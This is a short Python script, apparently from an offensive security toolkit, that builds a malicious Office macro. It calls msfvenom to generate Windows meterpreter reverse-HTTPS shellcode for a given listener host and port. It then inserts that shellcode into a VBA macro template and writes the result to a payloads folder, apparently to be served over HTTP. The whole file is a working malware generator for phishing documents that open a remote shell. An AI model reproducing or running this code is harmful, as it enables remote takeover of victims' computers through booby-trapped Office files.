#!/usr/bin/python3

# structure kept from methollow.py
# limited to csharp only
# default lport= 443
# writes out vbmacro

from meuk.hacksec import *

parser = argparse.ArgumentParser()
parser.add_argument("lhost", help="listener IP to use")
parser.add_argument("lport", help="listener port to use",  nargs='?', default="443")
parser.add_argument("payload", help="the payload type from msfvenom to generate shellcode for (default: windows/meterpreter/reverse_https)", nargs='?', default="windows/meterpreter/reverse_https")
args = parser.parse_args()

# Generate the shellcode given the preferred payload
print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Generating payload {bcolors.OKGREEN}{args.payload}{bcolors.OKBLUE} for LHOST={bcolors.OKGREEN}{args.lhost}{bcolors.OKBLUE} and LPORT={bcolors.OKGREEN}{args.lport}{bcolors.ENDC}")
result = subprocess.run(['msfvenom', '-p', args.payload, f"LHOST={args.lhost}", f"LPORT={args.lport}", 'exitfunc=thread', "-f", "vbapplication"], stdout=subprocess.PIPE)

if result.returncode != 0:
    exit(f"{bcolors.BOLD}{bcolors.FAIL}[x] ERROR: Msfvenom generation unsuccessful. Are you sure msfvenom is installed?{bcolors.ENDC}")

template=lezen('meuk/template/officemacro')

payload = result.stdout

#create the payload
macro = template.replace('[payloadreplace]', payload.decode('utf-8'))

#create the file with raw ouput
schrijven('http/payloads/office_macro.txt', macro)




